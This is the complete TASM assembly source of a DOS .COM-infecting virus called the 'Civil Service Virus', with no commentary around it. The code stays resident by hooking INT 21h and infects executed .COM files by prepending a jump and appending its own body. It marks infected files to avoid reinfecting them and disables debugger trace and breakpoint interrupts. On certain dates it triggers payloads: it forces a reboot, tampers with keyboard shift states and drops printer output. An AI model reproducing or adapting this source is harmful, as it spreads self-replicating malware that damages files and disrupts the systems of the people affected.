; Civil Service Virus by Marvin Giskard
; Turbo Assember version 2

Exec        equ  4B00h
OpenFile    equ  3D02h
ReadFile    equ  3Fh
WriteFile   equ  40h
CloseFile   equ  3Eh
EXESign     equ  5A4Dh
SeekTop     equ  4200h
SeekEnd     equ  4202h
GetAttr     equ  4300h
SetAttr     equ  4301h
GetDT       equ  5700h
SetDT       equ  5701h
MinSize     equ  4h
MaxSize     equ  0FBF0h
GetDate     equ  2Bh
FileID      equ  2206h
MemID       equ  4246h     ;     'FB'

.MODEL SMALL
.CODE
ORG 0100h

Start:
  XOR AX, AX
  MOV DS, AX
  CMP WORD PTR DS:01ACh, MemID
  JNE Instl2
  CMP WORD PTR DS:01AEh, FileID
  JE NoInstl2

Instl2:
  CALL InstallInMem

NoInstl2:
  PUSH CS
  PUSH CS
  POP DS
  POP ES
  MOV DX, OFFSET FileName
  MOV AX, 4B22h
  INT 21h
  INT 20h

FileName: DB 'TEST.COM',0

AddCode:
  JMP OverData

  ; Addcode's data

Buf:          DB 0, 0                   ; Miscellaneous Buf
JumpCode:     DB 0E9h, 00h, 00h         ; Code to be placed at front of file
FSize:        DW 0                      ; File size
Attr:         DB 0                      ; Attr of file being infected
FDateTime:    DD 0                      ; Time and date of file being infected
Generation:   DW 0                      ; Generation counter
Infected:     DW 0                      ; Number of files infected
Old24Handler: DD 0                      ; Old INT 24h handler
Acts:         DB 0                      ; Flag to stop reentry
Path:         DD 0

OverData:
  MOV WORD PTR DS:0100h, 0000h
  MOV BYTE PTR DS:0102h, 00h

  ; Check if handler already installed by examining 2 words in vector
  ; table entry of INT 6Bh

  XOR AX, AX
  MOV DS, AX
  CMP WORD PTR DS:01ACh, MemID
  JNE Instl
  CMP WORD PTR DS:01AEh, FileID
  JE AlreadyInstalled

Instl:
  CALL InstallInMem
  JMP ALreadyInstalled

InstallInMem:
  MOV WORD PTR DS:01ACh, MemID
  MOV WORD PTR DS:01AEh, FileID

  PUSH CS
  POP DS

  ; Get INT 21h handler in ES:BX.

  MOV AX, 3521h
  INT 21h
DoOldOfs:
  MOV SI, OFFSET DoOld+1
  MOV [SI], BX
  MOV [SI+2], ES
  PUSH ES
  PUSH BX
  POP DX
  POP DS
  MOV AX, 256Dh
  INT 21h

  ; This label is here so that the infect part will be able to calculate
  ; source offset of Int21Handler and then place it in here before writing
  ; it to disk. The OFFSET AddCode will be replaced by the right number.

Source:
  MOV SI, OFFSET AddCode

  ; Destination e.g. Where program will be placed are now calculated by
  ; taking the amount of memory in $0040:$0013. Multiply by 16 to get
  ; segment of memory end and then subract amount of blocks needed.
  ; This is where routine will be placed.

  MOV AX, 0040h
  MOV DS, AX
  MOV AX, WORD PTR DS:0013h
  MOV CL, 6
  SHL AX, CL

  ; Set dest. segment 2048 pages (32 K) below top of memory.

  SUB AX, 2048
  MOV ES, AX
  XOR DI, DI
  MOV CX, OFFSET AddCodeEnd - OFFSET AddCode
  PUSH CS
  POP DS
  REP MOVSB

  ; Set INT 21h Handler to point to our routine

  MOV AX, 2521h
  PUSH ES
  POP DS
  MOV DX, OFFSET Int21Handler - OFFSET AddCode
  INT 21h

  MOV BYTE PTR DS:[OFFSET Acts-OFFSET AddCode], 0

  RET

AlreadyInstalled:

  Call DisTrace

  ; Code to jump back to 0100h

  PUSH CS
  PUSH CS
  POP DS
  POP ES
  MOV AX, 0100h
  JMP AX

  ; Disable tracing and breakpoint setting for debuggers.

DisTrace:
  MOV AX, 0F000h
  MOV DS, AX
  MOV DX, 0FFF0h
  MOV AX, 2501h
  INT 21h
  MOV AX, 2503h
  INT 21h
  RET

Int21Handler:
  PUSH AX
  PUSH BX
  PUSH CX
  PUSH DX
  PUSH DI
  PUSH SI
  PUSH ES
  PUSH DS

  ; Install devious act if seed is right

  MOV AH, 2Ah
  INT 6Dh
  CMP CX, 1991
  JB Act
  CMP DL, 22
  JNE Timer
  DB 0EAh, 0F0h, 0FFh, 00h, 0F0h

Timer:
  MOV AH, 25h
  CMP DL, 29
  JE Inst1
  CMP DL, 1
  JE Inst2
  CMP DL, 10
  JE Inst3
  CMP DL, 16
  JE Inst4
  JMP Act
Inst1:
  MOV AL, 13h
  JMP SetVec
Inst2:
  MOV AL, 16h
  JMP SetVec
Inst3:
  MOV AL, 0Dh
  JMP SetVec
Inst4:
  MOV AL, 10h

SetVec:
  PUSH CS
  POP DS
  MOV DX, OFFSET Int24Handler - OFFSET AddCode
  INT 6Dh

Act:
  MOV AX, 0040h
  MOV DS, AX
  MOV AX, WORD PTR DS:006Eh

  PUSH CS
  POP DS
  MOV BH, DS:[OFFSET Acts - OFFSET AddCode]
  CMP BH, 3
  JE NoAct

  CMP AX, 22
  JE NoAct

  MOV BYTE PTR [SI], 3
  MOV AX, 3509h
  INT 21h
  PUSH ES
  PUSH BX
  POP DX
  POP DS
  MOV AX, 256Ah
  INT 21h
  PUSH CS
  POP DS
  MOV DX, OFFSET Int9Handler - OFFSET AddCode
  MOV AX, 2509h
  INT 21h

  MOV AX, 3517h
  INT 21h
  PUSH ES
  PUSH BX
  POP DX
  POP DS
  MOV AX, 256Ch
  INT 21h
  PUSH CS
  POP DS
  MOV DX, OFFSET Int17Handler - OFFSET AddCode
  MOV AX, 2517h
  INT 21h

NoAct:

  POP DS
  POP ES
  POP SI
  POP DI
  POP DX
  POP CX
  POP BX
  POP AX

  CMP AH, 4Bh
  JE Infect
DoOld:
  ;  This next bytes represent a JMP 0000h:0000h. The 0's will be replaced
  ;  by the address of the old 21 handler.
  DB 0EAh
  DD 0

DoOldPop:
  POP ES
  POP DS
  POP BP
  POP DI
  POP SI
  POP DX
  POP CX
  POP BX
  POP AX
  JMP DoOld

CloseQuit:

  MOV AX, 2524h
  MOV SI, OFFSET Old24Handler-OFFSET AddCode
  MOV DX, CS:[SI]
  MOV DS, CS:[SI+2]
  INT 21h

  PUSH CS
  POP DS
  MOV SI, OFFSET FDateTime-OFFSET AddCode
  MOV CX, DS:[SI]
  MOV DX, DS:[SI+2]
  MOV AX, SetDT
  INT 21h

  MOV AH, CloseFile
  INT 21h

  MOV AX, SetAttr
  MOV CL, DS:[OFFSET Attr - OFFSET AddCode]
  XOR CH, CH
  MOV SI, OFFSET Path-OFFSET AddCode
  MOV DX, DS:[SI]
  MOV DS, DS:[SI+2]

  INT 21h

  JMP DoOldPop

Infect:
  PUSH AX
  PUSH BX
  PUSH CX
  PUSH DX
  PUSH SI
  PUSH DI
  PUSH BP
  PUSH DS
  PUSH ES

  ; Get file's attr

  MOV AX, GetAttr
  INT 21h
  JC CloseQuit
  MOV CS:[OFFSET Attr-OFFSET AddCode], CL

  MOV SI, OFFSET Path-OFFSET AddCode
  MOV CS:[SI], DX
  MOV CS:[SI+2], DS

  ; Get/Set INT 24h handler

  MOV AX, 3524h
  INT 21h
  MOV SI, OFFSET Old24Handler-OFFSET AddCode
  MOV CS:[SI], BX
  MOV CS:[SI+2], ES
  MOV AX, 2524h
  PUSH CS
  POP DS
  MOV DX, OFFSET Int24Handler-OFFSET AddCode
  INT 21h

  ; Set new attribute

  MOV SI, OFFSET Path-OFFSET AddCode
  MOV DX, CS:[SI]
  MOV DS, CS:[SI+2]

  MOV AX, SetAttr
  MOV CX, 0020h
  INT 21h
  JC CloseQuitFoot

  MOV AX, OpenFile
  INT 21h
  JC CloseQuitFoot
  MOV BX, AX

  ; Get file's time and date and store

  MOV AX, GetDT
  INT 21h
  JC CloseQuitFoot
  PUSH CS
  POP DS
  MOV SI, OFFSET FDateTime-OFFSET AddCode
  MOV DS:[SI], CX
  MOV DS:[SI+2], DX

  ; Read first two bytes of file

  MOV AH, ReadFile
  MOV CX, 2
  MOV DX, OFFSET OverData+4-OFFSET AddCode
  INT 21h
  JC CloseQuitFoot

  ; Check if fisrt two bytes identify the file as an EXE file
  ; If so, then don't infect the file

  CMP DS:[OFFSET OverData+4-OFFSET AddCode], EXESign
  JE CloseQuitFoot

  ; Read next byte

  MOV AH, ReadFile
  MOV CX, 1
  MOV DX, OFFSET OverData+10-OFFSET AddCode
  INT 21h
  JC CloseQuitFoot

  ; Get file size

  MOV AX, SeekEnd
  XOR CX, CX
  XOR DX, DX
  INT 21h
  JC CloseQuitFoot

  ; Save filesize and calculate jump offset

  CMP DX, 0
  JG CloseQuitFoot
  CMP AX, MinSize
  JB CloseQuitFoot
  CMP AX, MaxSize
  JA CloseQuitFoot
  MOV DS:[OFFSET FSize-OFFSET AddCode], AX
  MOV CX, AX
  SUB AX, 03h
  MOV DS:[OFFSET JumpCode+1-OFFSET AddCode], AX

  ; Calculate and store source

  ADD CX, 0100h
  MOV [OFFSET Source+1-OFFSET AddCode], CX

  ADD CX, OFFSET DoOld-OFFSET AddCode
  MOV [OFFSET DoOldOfs-OFFSET AddCode+1], CX

  JMP OverFoot1

CloseQuitFoot:
  JMP CloseQuit

OverFoot1:
  ; Read last 2 bytes to see if it is already infected

  MOV AX, SeekTop
  XOR CX, CX
  MOV DX, [OFFSET FSize-OFFSET AddCode]
  SUB DX, 2
  INT 21h

  MOV AH, ReadFile
  MOV CX, 2
  MOV DX, OFFSET Buf-OFFSET AddCode
  INT 21h

  CMP [OFFSET Buf-OFFSET AddCode], FileID
  JE CloseQuitFoot

  ; Prepare to write new jump

  MOV AX, SeekTop
  XOR CX, CX
  XOR DX, DX
  INT 21h

  ; Write new jump

  MOV AH, WriteFile
  MOV CX, 3
  MOV DX, OFFSET JumpCode-OFFSET AddCode
  INT 21h

  ; Write addcode
  ; Code to restore first three bytes is at start of addcode
  ; Int21 handler is also included
  ; Generation counter is included in data
  ; ID is at the end of addcode

  MOV AX, SeekEnd
  XOR CX, CX
  XOR DX, DX
  INT 21h

  ; Increase generation counter before writing it to the new file

  INC WORD PTR [OFFSET Generation - OFFSET AddCode]

  ; Set files infected to 0, for child hasn't infected anyone.

  MOV SI, OFFSET Infected - OFFSET AddCode
  PUSH WORD PTR [SI]
  MOV WORD PTR [SI], 0

  MOV AH, WriteFile
  MOV DX, OFFSET AddCode - OFFSET AddCode      ; 0000
  MOV CX, OFFSET AddCodeEnd - OFFSET AddCode
  INT 21h

  ; Decrease counter again, cause all his children should have the same
  ; generation count

  DEC WORD PTR [OFFSET Generation - OFFSET AddCode]

  ; Pop number of files infected and incread

  POP AX
  INC AX
  MOV WORD PTR [OFFSET Infected - OFFSET AddCode], AX

  JMP CloseQuit

Int24Handler:
  XOR AL, AL
  IRET

Int9Handler:
  PUSH AX
  PUSH CX
  PUSH DS

  MOV AX, 0040h
  MOV DS, AX
  MOV AH, BYTE PTR DS:006Ch
  CMP AH, 18
  JA NoChange
  MOV CL, 4
  SHL AH, CL
  SHR AH, CL
  MOV BYTE PTR DS:0017h, AH

NoChange:
  POP DS
  POP CX
  POP AX
  INT 6Ah
  IRET

Int17Handler:
  CMP AH, 00h
  JNE DoOld17
  PUSH DS
  PUSH AX
  PUSH BX
  MOV BX, 0040h
  MOV DS, BX
  MOV BH, BYTE PTR DS:006Ch
  SHR BH, 1
  SHR BH, 1
  CMP BH, 22h
  JE Ignore17
  POP BX
  POP AX
  POP DS

DoOld17:
  INT 6Ch
  IRET

Ignore17:
  POP BX
  POP AX
  POP DS
  IRET

  DW FileID

AddCodeEnd:

END Start

